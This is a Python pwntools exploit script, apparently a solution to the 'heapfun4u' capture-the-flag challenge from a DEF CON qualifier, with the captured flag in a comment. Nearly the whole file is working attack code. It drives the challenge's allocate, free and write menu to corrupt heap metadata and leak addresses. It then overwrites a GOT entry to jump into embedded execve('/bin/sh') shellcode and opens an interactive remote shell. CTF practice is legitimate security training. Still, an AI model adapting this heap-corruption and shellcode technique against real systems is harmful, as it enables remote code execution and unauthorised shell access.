#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

# The flag is: Oh noze you pwned my h33p.


#host = "10.211.55.23"
#port = 8888
host = "heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me"
port = 3957

r = remote(host,port)


def alloca(size):
    r.recvuntil("|")
    r.sendline("A")
    r.recvuntil(":")
    r.sendline(str(size))
    
def free(idx):
    r.recvuntil("|")
    r.sendline("F")
    data = r.recvuntil("100")
    r.recvuntil(":")
    r.sendline(str(idx))
    return data

def w(idx,data):
    r.recvuntil("|")
    r.sendline("W")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)

def n():
    r.recvuntil("|")
    r.sendline("N")
    data = r.recvuntil("[A]llocate Buffer")
    return data


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
alloca(32)
alloca(100)
heap = int(free(1).split()[1],16) - 8
print hex(heap)
w(2,shellcode)
magic =  int(n().split()[3],16)
print hex(magic)
scadr = heap + 0x30
free(1)
exit_got = 0x602060
gmon = 0x602048
w(1,"a"*0x10+p64(magic+4+0x10+8))
alloca("32"+ "\x00"*6 + p64(0x1f0) + p64(0)*7 + p64(0x40))
alloca(400)

w(4,49*p64(scadr))
r.interactive()
